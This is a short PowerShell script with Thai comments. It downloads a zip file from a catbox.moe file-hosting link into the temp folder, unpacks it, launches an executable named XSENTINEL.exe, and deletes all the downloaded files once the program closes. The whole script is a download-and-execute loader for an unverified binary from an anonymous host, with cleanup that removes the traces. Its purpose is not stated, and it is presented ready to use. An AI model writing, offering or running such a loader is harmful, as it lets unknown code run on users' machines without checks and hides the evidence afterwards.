# --- CONFIG ---
# ใส่ลิ้งก์ไฟล์ .zip จาก Catbox ของคุณที่นี่
$url = "https://files.catbox.moe/n4g6f5.zip" 
$tempDir = "$env:TEMP\X_SENTINEL_LAB"
$zipFile = "$tempDir\data.zip"
$exeName = "XSENTINEL.exe" 

# 1. เตรียม Folder ทำงาน
if (Test-Path $tempDir) { Remove-Item -Path $tempDir -Recurse -Force }
New-Item -ItemType Directory -Path $tempDir | Out-Null

try {
    # 2. ดาวน์โหลดจาก Catbox
    Write-Host "[>] Downloading from Catbox..." -ForegroundColor Yellow
    Invoke-WebRequest -Uri $url -OutFile $zipFile -ErrorAction Stop

    # 3. แตกไฟล์ออกมา
    Write-Host "[>] Extracting package..." -ForegroundColor Cyan
    Expand-Archive -Path $zipFile -DestinationPath $tempDir -Force

    # 4. ตรวจสอบและเริ่มรัน
    $targetExe = Join-Path $tempDir $exeName
    if (Test-Path $targetExe) {
        Write-Host "[!] Launching Program..." -ForegroundColor Green
        # รันและรอให้โปรแกรมปิด (เพื่อรอเวลาลบไฟล์ทิ้ง)
        $process = Start-Process -FilePath $targetExe -PassThru -Wait
        
        # 5. ลบไฟล์ทิ้งทันทีเมื่อปิดโปรแกรม
        Write-Host "[+] Cleaning up system..." -ForegroundColor Magenta
        Remove-Item -Path $tempDir -Recurse -Force
        Write-Host "[√] Finished!" -ForegroundColor Green
    } else {
        Write-Host "[X] Error: $exeName not found in zip!" -ForegroundColor Red
    }
}
catch {
    Write-Host "[X] Download Failed! Check your Catbox link." -ForegroundColor Red
}
